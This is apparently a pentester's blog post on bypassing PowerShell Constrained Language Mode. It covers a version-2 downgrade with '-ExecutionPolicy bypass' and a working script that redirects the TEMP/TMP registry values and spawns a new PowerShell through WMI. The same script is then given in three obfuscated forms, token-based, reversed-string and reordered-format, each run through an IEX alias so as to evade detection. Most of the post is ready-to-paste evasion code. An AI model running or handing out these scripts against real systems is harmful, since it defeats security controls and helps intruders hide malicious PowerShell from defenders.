---
title:  "CLM Bypass"
date:   2021-10-17 19:12:00 +0000
categories: [techniques]
tags: [windows, powershell, bypass]
---

It is common during engagements to find that CLM (Constrained Language Mode) is configured on PowerShell as a SafeGuard or control against malicous activity.
This is a common misconception as there are many ways that CLM can be bypassed.
First check that CLM is in place by executing the following:

```
$ExecutionContext.SessionState.LanguageMode
```

If you want to set the Session to CLM from Full for testing then run:

```
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

I will leave it to the reader to make sure that the default is using CLM and not Full mode if testing.

Or if you want to change the PowerShell version then simplay add the arguments as per above.

The most common route is to simply downgrade to version 2 by using the '--version 2' argument.


```
powershell.exe -Version 2
```

If you want to bypass the execution policy then append the following:

```
powershell.exe -Version 2 -ExecutionPolicy bypass
```

Although this will likely work if PowerShell version 2 is installed alot of tools may not work to their full potential or simply not fit into your requirements using the legacy version.

There are tools out there to help ofcourse, these are usually execuable files which will touch disk and may not be what you want to do.

The following method can be simply pasted into a PowerShell window and a new PowerShell session is spawned as either the current PowerShell Version, or if needed, you could change the version to any other (2,3,4,5,6,7)

CLM Bypass Default
------------------

```
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```

Or if you want to change the PowerShell version then simply add the arguments needed such the below:

PowerShell Specific Version
---------------------------

```
$CurrTemp = $env:temp
$CurrTmp = $env:tmp
$TEMPBypassPath = "C:\windows\temp"
$TMPBypassPath = "C:\windows\temp"

Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value "$TEMPBypassPath"
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value "$TMPBypassPath"

Invoke-WmiMethod -Class win32_process -Name create -ArgumentList "Powershell.exe -Version 2 -ExecutionPolicy bypass"
sleep 5

#Set it back
Set-ItemProperty -Path 'hkcu:\Environment' -Name Tmp -Value $CurrTmp
Set-ItemProperty -Path 'hkcu:\Environment' -Name Temp -Value $CurrTemp
```

Token Based Obfuscated
----------------------

```
${C`U`RrtEmP} = ${enV:T`e`Mp}
${CUrRT`MP} = ${ENv:`T`mp}
${temp`B`YpAs`SPaTH} = ((("{0}{5}{3}{4}{1}{2}" -f 'C','wsYyKte','mp','Kw','indo',':Yy')) -RePlACe  'YyK',[cHar]92)
${TmPb`ypa`Ssp`Ath} = ((("{0}{1}{2}{3}" -f 'C:{0','}windows{','0}te','mp')) -F [cHAr]92)

&("{2}{1}{3}{0}"-f 'y','emPr','Set-It','opert') -Path ((("{0}{1}{2}{4}{3}"-f 'hkcu:','{0','}','ment','Environ'))-f [char]92) -Name ("{0}{1}"-f'T','mp') -Value "$TEMPBypassPath"
.("{3}{2}{4}{1}{0}"-f 'roperty','P','-It','Set','em') -Path ((("{0}{5}{6}{1}{3}{2}{4}"-f 'hk','NAtE','viro','n','nment','cu',':')) -creplacE'NAt',[cHAR]92) -Name ("{0}{1}"-f 'T','emp') -Value "$TMPBypassPath"

&("{0}{2}{4}{1}{3}" -f'In','Me','voke-W','thod','mi') -Class ("{2}{0}{3}{4}{1}"-f'i','s','w','n32_proce','s') -Name ("{0}{1}"-f'crea','te') -ArgumentList ("{3}{4}{1}{2}{0}" -f'l.exe','e','l','Powe','rsh')
&("{1}{0}" -f'eep','sl') 5


.("{2}{1}{0}{4}{3}"-f 'emPro','et-It','S','ty','per') -Path ((("{1}{2}{3}{0}{5}{4}"-f 'v','hk','cu:A','YlEn','nt','ironme')) -repLaCE ([cHAr]65+[cHAr]89+[cHAr]108),[cHAr]92) -Name ("{0}{1}"-f'T','mp') -Value ${cuRr`TMP}
.("{1}{0}{2}{3}"-f 'emPr','Set-It','opert','y') -Path ((("{2}{4}{3}{0}{1}"-f 'vironm','ent','hk','n','cu:4XQE')) -CREPLacE '4XQ',[cHar]92) -Name ("{1}{0}" -f 'emp','T') -Value ${cURr`T`Emp}
```

Reverse String Obfuscated
-------------------------

```
$0wN5  =  ")'x'+]31[diLLEHs$+]1[dIlLehS$ (&|)43]RaHC[,63]RaHC[,93]RaHC[,29]RaHC[  f-)'pmeTrr'+'uC}2{ eulaV- '+'p'+'m'+'e'+'T e'+'m'+'aN- }1{tn'+'emn'+'orivnE}0{'+':'+'uc'+'k'+'h'+'}'+'1{ htaP'+'-'+' y'+'tre'+'porPm'+'et'+'I'+'-'+'teS

p'+'mTrr'+'uC}2{ eula'+'V'+'- '+'pmT '+'emaN- }1{tnem'+'norivnE}'+'0{:uck'+'h}1{ htaP'+'- '+'ytrep'+'orPm'+'etI-teS'+'

kc'+'a'+'b t'+'i te'+'S'+'#
'+'

5'+' pe'+'els

'+'}3{e'+'x'+'e.ll'+'e'+'h'+'srew'+'oP}3{ tsiLtne'+'m'+'ug'+'rA- e'+'taerc '+'emaN-'+' '+'ssec'+'orp_23'+'n'+'iw'+' ss'+'a'+'lC-'+' d'+'ohte'+'MimW-e'+'k'+'o'+'vnI
'+'

}'+'3{h'+'taPs'+'sapyBPMT}'+'2{}3{'+' eulaV- pm'+'e'+'T e'+'maN'+'- '+'}'+'1{t'+'nem'+'nori'+'vnE}0'+'{:uck'+'h}1'+'{ '+'hta'+'P- y'+'trep'+'orPm'+'e'+'t'+'I'+'-teS'+'

}'+'3'+'{hta'+'P'+'s'+'s'+'ap'+'yBPMET}2{}3{ e'+'ula'+'V-'+' pmT'+' e'+'maN-'+' '+'}1'+'{tne'+'mn'+'orivnE'+'}0{:uckh}1{ htaP- '+'y'+'t'+'r'+'e'+'po'+'r'+'Pmet'+'I-'+'t'+'eS'+'


}3{p'+'m'+'et'+'}'+'0'+'{swod'+'n'+'i'+'w}0'+'{:C}3{ ='+' h'+'ta'+'Pssap'+'y'+'BPMT}'+'2{'+'

'+'}'+'3'+'{'+'pmet}0{'+'swodniw}0'+'{:'+'C}3{ '+'= h'+'taPs'+'sa'+'pyBPM'+'ET'+'}2{'+'

'+'pm'+'t:vne'+'}2'+'{ '+'='+' pmT'+'rruC}'+'2'+'{

pme'+'t:vne}2{'+' ='+' p'+'me'+'Trr'+'uC'+'}2{'(( ";.( $Env:coMSPeC[4,24,25]-jOIn'') ( "$( sv 'OFS' '' ) " +[STrIng]( (  gEt-VaRiAbLe  ("0w"+"N5") ).vAlue[-1 ..-((  gEt-VaRiAbLe  ("0w"+"N5") ).vAlue.lENGth )]) +"$(set  'ofs'  ' ' ) ")
```

Obfuscated String Reorder
------------------------

```
(("{80}{106}{34}{40}{49}{45}{120}{29}{125}{124}{65}{87}{90}{70}{110}{41}{71}{112}{118}{96}{69}{8}{82}{103}{122}{119}{21}{14}{117}{5}{51}{55}{24}{94}{95}{83}{98}{88}{84}{53}{105}{99}{6}{31}{73}{32}{33}{77}{78}{23}{50}{48}{17}{109}{25}{111}{9}{100}{115}{104}{97}{37}{62}{102}{63}{75}{1}{22}{93}{66}{27}{57}{7}{44}{4}{38}{56}{26}{60}{30}{101}{13}{18}{52}{10}{114}{68}{3}{43}{86}{19}{15}{92}{108}{89}{59}{12}{76}{20}{123}{81}{46}{0}{35}{107}{16}{58}{36}{116}{113}{47}{61}{74}{72}{85}{67}{121}{54}{42}{79}{64}{2}{39}{28}{11}{91}"-f'1 -Nam','l',' -Value ','

#S','lass w','hTMPB','v','nvoke-WmiMeth','C:A','Path','hell.exefkI','rr','kcu:AZM','I','kI
4','Property -','rrTm','assP','Pow','tem','viron','tempf','ue fkI45hTMPB',' fkI4','=','-ItemPr','ocess -N','I
','hCu','env:t','-Argume','ir','-N','a','em','e Tmp -V','Se','ntMW','in32','45','p','
45hT',' ','et it ba','od -C',' 45','W','rope','EMPByp',' =','5hT','ypassPa','ers','emProperty -Path ','tMW1','th ','_pr','

I','p
','MW1h','ame create ','r','1 -N','emp -','emp','rrTm','Pathfk','cu:',' 5','I',':tm','EMPBy','1h','onmentMW1 ','ty -Path MW','Va','En','me Tmp -','Value','-Name T','45','tM','Z','Mwi','
Set-It','k','ck
Set-I','p = 45he','

','h ','nv','Temp','P','ypass',' fkIC:A','Z','th = fk','ronme','ndowsAZMtempfkI
','1hkcu:AZMEn',' ','ntList fk','ame T','Mwi','vi','MW','hCurrT','alue 45hCu','at','athfkI
Set','p
','operty -','p','mP','
sleep','MW1hkcu:AZMEn','t-Ite','5','assPa','sAZM','h','AZMEnvironmen','ndow','men','hCu','emp
45')).ReplaCE('MW1',[STRiNg][CHAR]39).ReplaCE('fkI',[STRiNg][CHAR]34).ReplaCE('45h','$').ReplaCE(([CHAR]65+[CHAR]90+[CHAR]77),'\') |& ( $pshoMe[4]+$pSHOme[34]+'X')
```

